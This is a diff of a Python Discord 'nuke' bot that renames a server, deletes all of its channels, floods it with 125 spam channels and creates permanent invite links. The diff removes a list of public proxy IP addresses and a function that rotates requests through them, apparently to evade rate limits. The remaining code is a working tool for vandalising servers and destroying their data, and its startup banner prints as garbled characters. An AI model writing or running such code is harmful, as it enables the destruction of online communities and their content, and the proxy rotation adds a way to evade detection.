@@ -7,7 +7,6 @@ from colorama import Fore, Back, Style, init
 init()
 
 TOKEN = input("Token: ")
-PROXIES = ["213.241.205.1", "184.191.162.4", "80.15.19.7", "103.210.57.243", "50.228.226.58", "103.149.130.38", "41.65.174.98", "103.242.119.88", "117.54.114.32", "122.9.21.228", "103.127.1.130", "51.159.115.233", "73.185.216.244", "124.13.181.6", "103.156.56.2", "203.89.126.250", "157.245.27.9", "5.78.46.213", "75.89.101.62", "103.121.149.69", "113.161.131.43", "41.93.71.12", "196.1.95.128", "65.108.230.239", "103.118.78.194"]
 CHANNELS = ["HMG on top", "HMG runs u", "Jak is cool", "HMG the best"]
 SPAM = ["""
 ```Nuked By His Majesty's Guard [Ä¦Ðœâ‚²]```
@@ -23,10 +22,6 @@ intents = discord.Intents.all()
 client = commands.Bot(command_prefix = ">", intents=intents)
 client.remove_command("help")
 
-def change_proxy():
-  proxy = random.choice(PROXIES)
-  requests.get("https://discord.com/api/v6/channels/{channel.id}", proxies={"http": proxy, "https": proxy})
-
 @client.event
 async def on_ready():
     print(f"{Fore.MAGENTA}Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â‚¬Æ’Ã¢â‚¬Æ’Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜Ã¢â€“â€˜Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€“Ë†Ã¢â€¢â€”Ã¢â€“â€˜")
@@ -40,19 +35,15 @@ async def on_ready():
 @client.command()
 async def nuke(ctx):
     await ctx.send("You wanna see what the massacre is? ill let u see it")
-    change_proxy()
     await ctx.guild.edit(name="HMG FIXES THE SERVER")
     guild = ctx.guild
-    change_proxy()
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete()
-            change_proxy()
         except:
             print("DELETING CHANNELS: FAILED")
     for _i in range(125):
         await ctx.guild.create_text_channel(name=(random.choice(CHANNELS)))
-        change_proxy()
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite Link: {link}")
